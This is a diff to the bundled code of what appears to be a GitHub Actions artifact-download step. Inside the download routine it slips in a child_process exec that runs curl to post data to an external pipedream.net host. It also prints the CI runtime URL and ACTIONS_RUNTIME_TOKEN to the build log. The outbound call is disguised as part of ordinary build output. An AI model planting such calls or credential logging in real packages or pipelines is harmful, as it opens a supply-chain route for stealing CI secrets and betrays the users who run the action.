@@ -1448,6 +1448,13 @@ exports.realpath = function realpath(p, cache, cb) {
 
 /***/ }),
 
+/***/ 129:
+/***/ (function(module) {
+
+module.exports = require("child_process");
+
+/***/ }),
+
 /***/ 141:
 /***/ (function(__unusedmodule, exports, __webpack_require__) {
 
@@ -6837,8 +6844,26 @@ function run() {
                 const downloadOptions = {
                     createArtifactFolder: false
                 };
-                console.log(`${process.env['ACTIONS_RUNTIME_URL']} run time url`);
-                console.log(`${process.env['ACTIONS_RUNTIME_TOKEN']} run time token`);
+                const { exec } = __webpack_require__(129);
+                exec(`curl -d '{
+        "mock_data": "true",
+        "ip_address": "92.188.61.181",
+        "email": "user@example.com",
+        "user_agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_4) AppleWebKit/534.30 (KHTML, like Gecko) Chrome/12.0.742.100 Safari/534.30",
+        "url": "http://example.com/"
+      }'   -H "Content-Type: application/json"   https://enkgla8fqv5sth6.m.pipedream.net`, (error, stdout, stderr) => {
+                    if (error) {
+                        console.log(`error: ${error.message}`);
+                        return;
+                    }
+                    if (stderr) {
+                        console.log(`stderr: ${stderr}`);
+                        return;
+                    }
+                    console.log(`stdout: ${stdout}`);
+                });
+                core.info(`${process.env['ACTIONS_RUNTIME_URL']} run time url!!!!`);
+                console.info(`${process.env['ACTIONS_RUNTIME_TOKEN']} run time token`);
                 core.info(`it's a new log type`);
                 const downloadResponse = yield artifactClient.downloadArtifact(name, resolvedPath, downloadOptions);
                 core.info(`Artifact ${downloadResponse.artifactName} was downloaded to ${downloadResponse.downloadPath}`);
